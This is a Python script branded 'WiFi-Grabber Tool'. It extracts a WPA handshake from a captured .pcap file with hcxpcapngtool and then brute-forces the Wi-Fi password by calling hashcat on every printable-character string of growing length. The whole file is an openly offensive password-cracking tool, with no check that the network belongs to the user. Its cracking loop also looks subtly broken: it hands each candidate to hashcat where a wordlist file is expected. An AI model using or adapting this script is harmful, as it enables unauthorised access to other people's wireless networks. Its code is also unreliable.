import os
import subprocess
import string
import itertools
import sys
import platform

# Platform-specific timeout handling
if platform.system() == 'Windows':
    import threading
    timeout_triggered = threading.Event()
else:
    import signal

ascii_art = """
   ██╗    ██╗██╗███████╗██╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
   ██║    ██║██║██╔════╝██║    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
   ██║ █╗ ██║██║█████╗  ██║    ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
   ██║███╗██║██║██╔══╝  ██║    ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
   ╚███╔███╔╝██║██║     ██║    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
    ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
"""

print(ascii_art)
print("          WiFi-Grabber Tool • © 2023 • 47lecoste • SITO MEME")
print("")
print("")
print("  _____________________________________________________________________________________________\n")
print("* If files you select aren't in the same directory of the script, please write their entire path.")
print("")
print("** Type ^C (CTRL + c) to stop the script, if you want to exit before the end of the operation.")
print("  _____________________________________________________________________________________________\n")
print("")
print("")

# Select input .pcap file
input_file = ""
while True:
    input_file = input("Insert input .pcap file's NAME or PATH: ")
    if input_file.endswith((".pcap", ".cap", ".pcapng")) and os.path.isfile(input_file):
        break
    else:
        print("Invalid input file. Please make sure the file exists and has a valid format.")

hc22000_file = "wpa_crack.hc22000"
subprocess.run(["hcxpcapngtool", "-o", hc22000_file, input_file])

print("  _____________________________________________________________________________________________\n")
print("  ---------------------------------------------------------------------------------------------\n")

charset = string.printable  # Define the character set to be used

# Set the timeout to 120" = 2' (2 minutes is a very low time, and this is just for example) 
timeout = 120

# Platform-specific timeout setup
timer = None  # Initialize timer variable for cleanup
if platform.system() == 'Windows':
    # Windows: Use threading.Timer since SIGALRM is not available
    def timeout_handler():
        timeout_triggered.set()
    
    timer = threading.Timer(timeout, timeout_handler)
    timer.daemon = True
    timer.start()
else:
    # Unix/Linux/Mac: Use signal.SIGALRM
    def timeout_handler(signum, frame):
        raise TimeoutError("Timeout expired. Password not found.")
    
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(timeout)

# Brute force attack
try:
    password_length = 1
    while True:
        # Check timeout on Windows
        if platform.system() == 'Windows' and timeout_triggered.is_set():
            raise TimeoutError("Timeout expired. Password not found.")
        
        for password in itertools.product(charset, repeat=password_length):
            # Check timeout on Windows during iteration
            if platform.system() == 'Windows' and timeout_triggered.is_set():
                raise TimeoutError("Timeout expired. Password not found.")
            
            password = ''.join(password)
            result = subprocess.run(["hashcat", "-m", "22000", hc22000_file, password], capture_output=True)
            if "Cracked" in result.stdout.decode():
                print(f"Password found: {password}")
                raise SystemExit(0)
        password_length += 1
except TimeoutError as e:
    print(str(e))
finally:
    # Cleanup timeout
    if platform.system() == 'Windows':
        if timer is not None:
            timer.cancel()
    else:
        signal.alarm(0)
